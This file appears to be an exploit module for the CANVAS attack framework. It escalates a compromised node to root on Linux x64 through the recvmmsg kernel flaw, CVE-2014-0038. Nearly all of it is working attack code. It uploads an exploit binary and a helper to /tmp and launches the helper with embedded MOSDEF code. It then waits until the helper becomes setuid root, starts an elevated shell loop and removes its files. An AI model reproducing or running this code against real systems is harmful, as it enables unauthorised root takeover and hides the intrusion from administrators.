#!/usr/bin/env python

import sys
import time
import os
if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

NAME                            = 'recvmmsg local root'
DESCRIPTION                     = 'Elevate MOSDEF Node privileges through CVE-2014-0038'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'GNU/Linux'
DOCUMENTATION['Repeatability']  = 'Infinite'
DOCUMENTATION['CVE Name']       = 'CVE-2014-0038'
DOCUMENTATION['CVE Url']        = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0038'

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [['Linux', 'x64']]

DOCUMENTATION['Notes'] = """

Tested on:
- Ubuntu 13.10 x86_64 3.11.0-12-generic

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.lx             = os.path.join(self.local_path, 'x')
        self.lh             = os.path.join(self.local_path, 'h')
        self.dx             = '/tmp/x'
        self.dh             = '/tmp/h'

    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename = dst)
        except NodeCommandError, i:
            self.log('[x] failed to upload %s to %s: %s' % (src, dst, str(i)))
            return False
        self.log('[+] Upload succeeded ...')
        return True

    def statFile(self, path):
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            self.log('[x] Could not open %s ...' % path)
            return {}
        ret,stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            #self.log('[+] st_mode: %x' % stat['st_mode'])
            #self.log('[+] st_uid: %x' % stat['st_uid'])
            return stat
        else:
            self.log('[x] fstat failed ...')
            return {}

    def cleanup(self):
        self.log('[+] Cleaning up...')
        self.node.runcommand('rm -f %s %s' % (self.dx, self.dh))

    def execveHelper(self, wait = 0):
        lvars = {}
        lvars['ENV_XP'] = 'ENV_XP=%s' % self.dx
        lvars['HELPER'] = self.dh
        lvars['MOSDEF'] = '%d' % self.node.shell.fd
        lvars['WAIT']   = wait

        code = """
        #import "string", "ENV_XP" as "ENV_XP"
        #import "string", "HELPER" as "HELPER"
        #import "string", "MOSDEF" as "MOSDEF"

        #import "int", "WAIT" as "WAIT"

        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            char *argv[3];
            char *env[2];
            int pid;

            argv[0] = HELPER;
            argv[1] = MOSDEF;
            argv[2] = NULL;

            env[0] = ENV_XP;
            env[1] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, env);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """
        ret = self.node.shell.runCode(code, lvars)
        #self.log('[+] execve helper ret: %d ...' % ret)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]

        if isinstance(self.node, linuxNode):
            if self.node.proctype != 'x64':
                self.log('Node of type %s proctype %s is not supported.' % (self.node.nodetype, self.node.proctype))
                return 0

        smep = self.check_smep()
        if (smep):
            self.log('[+] Found SMEP on target host')
            self.log('[x] Aborting')
            return False

        stat = self.statFile(self.dh)
        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
            self.log('[+] Already compromised')
            self.log('[+] Initing elevated MOSDEF loop...')
            self.execveHelper(wait = 1)
            return True

        self.log('[+] Uploading helper and exploit ...')
        if self.nodeUpload(self.lx, self.dx) == False:
            return False
        if self.nodeUpload(self.lh, self.dh) == False:
            return False

        self.log('[+] Executing helper...')
        self.execveHelper()

        self.log('[+] Waiting...')

        # snooze is set to 20 in helper, average race is won in 10 secs
        i = 30
        while i:
            stat = self.statFile(self.dh)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                self.log('[+] Compromised!')
                self.execveHelper(wait = 1)
                self.cleanup()
                self.log('[+] Done')
                break
            i -= 1
            time.sleep(1)
        if not i:
            self.log('[x] Looks like we failed, try again!')
            self.cleanup()
            return False

        return True
